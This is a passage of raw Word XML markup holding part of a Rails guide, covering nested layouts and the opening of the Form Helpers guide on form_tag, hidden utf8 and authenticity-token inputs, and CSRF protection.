                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;div</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>id="right_menu"&gt;Right menu items here&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D175098" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  &lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>content_for?(:news_content) ? yield(:news_content) : yield</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="727BA9B6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D2AAACC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>render :template</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'layouts/application'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1511B506" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>That’s it. The News views will use the new layout, hiding the top menu and adding a new right menu inside the “content” div.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635A72C8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are several ways of getting similar results with different sub-templating schemes using this technique. Note that there is no limit in nesting levels. One can use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionView::render</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>render :template =&gt; 'layouts/news'</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to base a new layout on the News layout. If you are sure you will not subtemplate the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>News</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> layout, you can replace the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>content_for?(:news_content) ? yield(:news_content) : yield</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> with simply </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>yield</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FF24710" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRPr="005D6D6E" w:rsidRDefault="00AC12D4" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2C9CF393" w14:textId="015B3E78" w:rsidR="005D6D6E" w:rsidRDefault="002B5D47" w:rsidP="006E53E9">
      <w:pPr>
        <w:pStyle w:val="2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t>3.2、</w:t>
      </w:r>
      <w:hyperlink r:id="rId294" w:history="1">
        <w:r w:rsidR="005D6D6E">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>Action View Form Helpers</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1C39222D" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009012A1">
        <w:rPr>
          <w:kern w:val="0"/>
        </w:rPr>
        <w:t>Rails Form helpers</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56E0CEAB" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>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Forms in web applications are an essential interface for user input. However, form markup can quickly become tedious to write and maintain because of form control naming and their numerous attributes. Rails deals away with these complexities by providing view helpers for generating form markup. However, since they have different use-cases, developers are required to know all the differences between similar helper methods before putting them to use.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09656A6A" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>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In this guide you will:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12B01464" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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Create search forms and similar kind of generic forms not representing any specific model in your application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="080AF66E" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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Make model-centric forms for creation and editing of specific database records</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="279C92FC" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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Generate select boxes from multiple types of data</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CBF89CA" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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Understand the date and time helpers Rails provides</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B15E5B9" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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Learn what makes a file upload form different</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321AADCB" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>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Learn some cases of building forms to external resources</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="448A1871" w14:textId="77777777" w:rsidR="009012A1" w:rsidRPr="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="101"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009012A1">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Find out where to look for complex forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D87CC6" w14:textId="77777777" w:rsidR="009012A1" w:rsidRDefault="009012A1" w:rsidP="009012A1"/>
    <w:p w14:paraId="0C37639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This guide is not intended to be a complete documentation of available form helpers and their arguments. Please visit </w:t>
      </w:r>
      <w:hyperlink r:id="rId295" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>the Rails API documentation</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> for a complete reference.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43F553E7"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1 Dealing with Basic Forms</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A0B06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most basic form helper is </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">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2160"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="4C352073" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="709C3BB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form_tag do</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34AC466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Form contents</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5014E22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2D2AC8A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When called without arguments like this, it creates a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>&lt;form&gt;</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> tag which, when submitted, will POST to the current page. For instance, assuming the current page is </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/home/index</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, the generated HTML will look like this (some line breaks added for readability):</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548A9DA4" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5D605F3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w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>accept-charset="UTF-8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>action="/home/index"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>method="post"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5531DC2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&lt;div</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>style="margin:0;padding:0"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74D7CB3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name="utf8"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="&amp;#x2713;"</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159AD66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name="authenticity_token"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>type="hidden"</w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="006E53E9">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>value="f755bb0ed134b76c432144748a6d4b7a7ddf2b71"</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7020829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&lt;/div&gt;</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A3EABC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Form contents</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4150D1B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&lt;/form&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="64CE8AF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Now, you’ll notice that the HTML contains something extra: a </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> element with two hidden input elements inside. This div is important, because the form cannot be successfully submitted without it. The first input element with name </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>utf8</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> enforces browsers to properly respect your form’s character encoding and is generated for all forms whether their actions are “GET” or “POST”. The second input element with name </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> is a security feature of Rails called </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:b/>
          <w:bCs/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cross-site request forgery protection</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, and form helpers generate it for every non-GET form (provided that this security feature is enabled). You can read more about this in the </w:t>
      </w:r>
      <w:hyperlink r:id="rId296" w:anchor="cross-site-request-forgery-csrf" w:history="1">
        <w:r w:rsidRPr="006E53E9">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Security Guide</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B5551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Throughout this guide, the </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>div</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with the hidden input elements will be excluded from code samples for brevity.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="618EDBED"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1.1 A Generic Search Form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4097FB4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One of the most basic forms you see on the web is a search form. This form contains:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218E8C29" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>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a form element with “GET” method,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A3C66D" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>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a label for the input,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A003304" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>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a text input element, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B1FE31" w14:textId="77777777" w:rsidR="006E53E9" w:rsidRPr="006E53E9" w:rsidRDefault="006E53E9" w:rsidP="006E53E9">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="85"/>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a submit element.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B715A3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To create this form you will use </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>form_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>label_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>text_field_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>submit_tag</w:t>
      </w:r>
      <w:r w:rsidRPr="006E53E9">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, respectively. Like this:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5640"/>
      </w:tblGrid>
      <w:tr w:rsidR="006E53E9" w:rsidRPr="006E53E9" w14:paraId="7EBC6472" w14:textId="77777777" w:rsidTr="006E53E9">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
